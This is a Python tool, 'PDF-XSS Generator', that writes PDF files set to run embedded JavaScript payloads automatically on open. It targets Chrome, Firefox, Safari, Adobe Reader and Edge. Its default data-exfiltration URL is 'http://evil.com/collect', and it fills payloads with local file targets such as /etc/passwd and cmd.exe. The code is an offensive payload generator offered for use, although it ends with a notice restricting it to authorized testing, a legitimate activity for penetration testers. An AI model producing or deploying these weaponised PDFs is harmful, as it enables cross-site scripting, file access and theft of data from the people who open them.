#!/usr/bin/env python3
"""
PDF-XSS Generator v3.0 - Optimized Browser-Specific PDF Payload Generator
==========================================================================

Simplified and optimized PDF XSS payload generator with browser-specific targeting.
Combines payloads from JSON databases and generates PDF files with XSS payloads.

Features:
- Browser-specific JSON payload databases
- Simplified command-line interface  
- One payload per page for browser-specific files
- Clean PDF generation with complete payload visibility
- OS-aware file system targeting

Supported Browsers: Chrome, Firefox, Safari, Adobe Reader, Microsoft Edge
"""

import argparse
import json
import os
import sys
import platform
from datetime import datetime

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

# Version and metadata
VERSION = "3.0"
AUTHOR = "SNGWN"

def get_os_specific_paths():
    """Get OS-specific file paths for file system exploits"""
    current_os = platform.system().lower()
    
    if current_os == 'windows':
        return {
            'sensitive_files': [
                'file:///C:/Windows/System32/calc.exe',
                'file:///C:/Windows/System32/cmd.exe', 
                'file:///C:/Windows/System32/drivers/etc/hosts',
                'file:///C:/Windows/win.ini'
            ],
            'directories': [
                'file:///C:/Windows/System32/',
                'file:///C:/Users/',
                'file:///C:/Program Files/'
            ]
        }
    elif current_os == 'darwin':  # macOS
        return {
            'sensitive_files': [
                'file:///etc/passwd',
                'file:///etc/hosts',
                'file:///Applications/Calculator.app',
                'file:///System/Library/CoreServices/Finder.app'
            ],
            'directories': [
                'file:///Applications/',
                'file:///Users/',
                'file:///System/'
            ]
        }
    else:  # Linux and others
        return {
            'sensitive_files': [
                'file:///etc/passwd',
                'file:///etc/hosts',
                'file:///proc/version',
                'file:///bin/bash'
            ],
            'directories': [
                'file:///home/',
                'file:///etc/',
                'file:///usr/bin/'
            ]
        }

def load_browser_payloads(browser):
    """Load payloads from browser-specific JSON file"""
    json_file = f"{browser}.json"
    
    if not os.path.exists(json_file):
        print(f"❌ Error: {json_file} not found")
        return []
    
    try:
        with open(json_file, 'r') as f:
            data = json.load(f)
            payloads = data.get('payloads', [])
            
            # Add browser field to each payload if not present
            for payload in payloads:
                if 'browser' not in payload:
                    payload['browser'] = browser
                    
            return payloads
    except Exception as e:
        print(f"❌ Error loading {json_file}: {e}")
        return []

def replace_payload_variables(payload, url, os_paths=None):
    """Replace variables in payloads with actual values"""
    # Replace URL placeholder
    payload = payload.replace('{url}', url)
    
    # Replace OS-specific file paths if available
    if os_paths:
        if '{sensitive_file}' in payload:
            payload = payload.replace('{sensitive_file}', os_paths['sensitive_files'][0])
        if '{directory}' in payload:
            payload = payload.replace('{directory}', os_paths['directories'][0])
    
    return payload

def create_pdf_with_payload(filename, payload_data, url, pdf_version="1.7"):
    """Create PDF file with a single payload"""
    payload = replace_payload_variables(payload_data['payload'], url, get_os_specific_paths())
    
    # Escape payload for PDF display
    escaped_payload = payload.replace('(', '\\(').replace(')', '\\)').replace('\\', '\\\\')
    
    # Format payload for display (complete visibility)
    display_lines = []
    max_line_length = 75
    
    # Split payload into readable lines
    words = escaped_payload.split(' ')
    current_line = ''
    
    for word in words:
        test_line = current_line + (' ' if current_line else '') + word
        if len(test_line) <= max_line_length:
            current_line = test_line
        else:
            if current_line:
                display_lines.append(current_line)
                current_line = word
            else:
                # Single word longer than max length, split it
                display_lines.append(word[:max_line_length])
                current_line = word[max_line_length:]
    
    if current_line:
        display_lines.append(current_line)
    
    # Create payload display text for PDF
    payload_display = ''
    for i, line in enumerate(display_lines):
        payload_display += f'({line}) Tj\n0 -12 Td\n'
    
    # Create PDF content
    content_length = len(payload_display) + 400  # Estimate content length
    
    pdf_content = f"""%PDF-{pdf_version}
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 5 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <</Font <</F1 6 0 R>>>>
>>
endobj

4 0 obj
<<
/Length {content_length}
>>
stream
BT
/F1 14 Tf
50 750 Td
(FILENAME: {os.path.basename(filename)}) Tj
0 -25 Td
/F1 12 Tf
(Browser: {payload_data['browser'].title()}) Tj
0 -20 Td
(Technique: {payload_data['technique']}) Tj
0 -20 Td
(Category: {payload_data['category']}) Tj
0 -20 Td
(Risk Level: {payload_data['risk_level'].title()}) Tj
0 -30 Td
/F1 10 Tf
(COMPLETE PAYLOAD:) Tj
0 -15 Td
(====================================) Tj
0 -15 Td
{payload_display}
ET
endstream
endobj

5 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({payload})
>>
endobj

6 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
endobj

xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000069 00000 n 
0000000126 00000 n 
0000000231 00000 n 
0000000{len(str(content_length + 600)):04d} 00000 n 
0000000{len(str(content_length + 700)):04d} 00000 n 
trailer
<<
/Size 7
/Root 1 0 R
>>
startxref
{content_length + 800}
%%EOF"""

    # Write PDF file
    try:
        with open(filename, 'w') as f:
            f.write(pdf_content)
        return True
    except Exception as e:
        print(f"❌ Error creating {filename}: {e}")
        return False

def create_browser_specific_file(browser, payloads, url, output_dir, pdf_version):
    """Create a single PDF file with all payloads for a browser (one payload per page)"""
    if not payloads:
        print(f"❌ No payloads found for {browser}")
        return False
    
    # Create output directory
    os.makedirs(output_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    print(f"\n🔥 Creating {browser} browser-specific file with {len(payloads)} payloads...")
    print(f"📄 Mode: One payload per page")
    
    success_count = 0
    
    for i, payload_data in enumerate(payloads, 1):
        filename = os.path.join(output_dir, f"{browser}_payload_{i:03d}_{timestamp}.pdf")
        
        if create_pdf_with_payload(filename, payload_data, url, pdf_version):
            success_count += 1
            if i <= 3:  # Show first 3 files created
                print(f"  ✅ {os.path.basename(filename)} - {payload_data['technique']}")
            elif i == 4 and len(payloads) > 3:
                print(f"  ... and {len(payloads) - 3} more files")
    
    print(f"\n📊 Successfully created {success_count}/{len(payloads)} PDF files")
    return success_count > 0

def create_individual_files(browser, payloads, url, output_dir, pdf_version, count_limit=None):
    """Create individual PDF files for each payload"""
    if not payloads:
        print(f"❌ No payloads found for {browser}")
        return False
    
    # Apply count limit if specified
    if count_limit:
        payloads = payloads[:count_limit]
    
    # Create output directory
    os.makedirs(output_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    print(f"\n🔥 Creating {len(payloads)} individual PDF files for {browser}...")
    
    success_count = 0
    
    for i, payload_data in enumerate(payloads, 1):
        filename = os.path.join(output_dir, f"{browser}_{payload_data['technique']}_{timestamp}.pdf")
        
        if create_pdf_with_payload(filename, payload_data, url, pdf_version):
            success_count += 1
            print(f"  ✅ {os.path.basename(filename)}")
    
    return success_count > 0

def main():
    parser = argparse.ArgumentParser(
        description='PDF-XSS Generator v3.0 - Optimized Browser-Specific PDF Payload Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
EXAMPLES:
  python3 script.py -b chrome -u http://test.com           # Generate Chrome PDF files  
  python3 script.py -b firefox --single-file -u http://evil.com  # Single file with all Firefox payloads (1 per page)
  python3 script.py -b safari --count 5                   # Generate 5 Safari PDF files
  python3 script.py -b adobe -u http://webhook.site/xyz   # Generate Adobe PDF files
  python3 script.py -b all -u http://test.com             # Generate files for all browsers

BROWSER-SPECIFIC JSON FILES:
  chrome.json   - Chrome/PDFium specific payloads
  firefox.json  - Firefox/PDF.js specific payloads  
  safari.json   - Safari/PDFKit specific payloads
  adobe.json    - Adobe Reader/Acrobat specific payloads
  edge.json     - Microsoft Edge specific payloads

FEATURES:
  ✓ Browser-specific payload targeting
  ✓ Complete payload visibility in PDF files
  ✓ OS-aware file system targeting
  ✓ One payload per page option
  ✓ Simplified command-line interface
        '''
    )
    
    parser.add_argument('-b', '--browser', 
                        choices=['chrome', 'firefox', 'safari', 'adobe', 'edge', 'all'],
                        help='Target browser (required unless using --list-browsers)')
    parser.add_argument('-u', '--url', 
                        default='http://evil.com/collect',
                        help='Target URL for data exfiltration (default: http://evil.com/collect)')
    parser.add_argument('-o', '--output-dir', 
                        default='Files',
                        help='Output directory for PDF files (default: Files)')
    parser.add_argument('--single-file', action='store_true',
                        help='Create single file with all payloads for browser (one payload per page)')
    parser.add_argument('--count', type=int,
                        help='Limit number of payloads to generate')
    parser.add_argument('--pdf-version', 
                        choices=['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'],
                        default='1.7',
                        help='PDF version (default: 1.7)')
    parser.add_argument('--list-browsers', action='store_true',
                        help='List available browsers and payload counts')
    
    args = parser.parse_args()
    
    # List browsers option
    if args.list_browsers:
        print("📊 AVAILABLE BROWSERS AND PAYLOAD COUNTS:")
        print("=" * 45)
        
        browsers = ['chrome', 'firefox', 'safari', 'adobe', 'edge']
        for browser in browsers:
            payloads = load_browser_payloads(browser)
            status = "✅" if payloads else "❌"
            print(f"{status} {browser:8} - {len(payloads):2d} payloads ({browser}.json)")
        
        return
    
    # Validate required arguments
    if not args.browser:
        print("❌ Error: -b/--browser is required")
        print("Use --list-browsers to see available browsers")
        return
    
    # Display header
    print(f"🚀 PDF-XSS GENERATOR v{VERSION}")
    print("=" * 40)
    print(f"Target Browser: {args.browser}")
    print(f"Target URL: {args.url}")
    print(f"Output Directory: {args.output_dir}")
    print(f"PDF Version: {args.pdf_version}")
    if args.single_file:
        print("Mode: Single file with all payloads (1 per page)")
    if args.count:
        print(f"Payload Limit: {args.count}")
    print()
    
    # Determine browsers to process
    if args.browser == 'all':
        browsers = ['chrome', 'firefox', 'safari', 'adobe', 'edge']
    else:
        browsers = [args.browser]
    
    total_files_created = 0
    
    # Process each browser
    for browser in browsers:
        print(f"📖 Loading {browser} payloads from {browser}.json...")
        payloads = load_browser_payloads(browser)
        
        if not payloads:
            print(f"⚠️  No payloads found for {browser}")
            continue
            
        print(f"✅ Loaded {len(payloads)} payloads for {browser}")
        
        # Create PDF files
        if args.single_file:
            # Single file mode: one payload per page
            success = create_browser_specific_file(browser, payloads, args.url, args.output_dir, args.pdf_version)
            if success:
                total_files_created += len(payloads)
        else:
            # Individual files mode
            success = create_individual_files(browser, payloads, args.url, args.output_dir, args.pdf_version, args.count)
            if success:
                count = args.count if args.count and args.count < len(payloads) else len(payloads)
                total_files_created += count
    
    # Summary
    print(f"\n🎯 GENERATION COMPLETE")
    print("=" * 30)
    print(f"✅ Total PDF files created: {total_files_created}")
    print(f"📁 Files saved in: {args.output_dir}/")
    
    if args.single_file:
        print(f"📄 Mode: One payload per page (each PDF contains 1 payload)")
    
    # Security notice
    print(f"\n⚠️  SECURITY NOTICE:")
    print("These PDF files contain XSS payloads for authorized security testing only.")
    print("Use only with proper permissions in controlled environments.")

if __name__ == "__main__":
    main()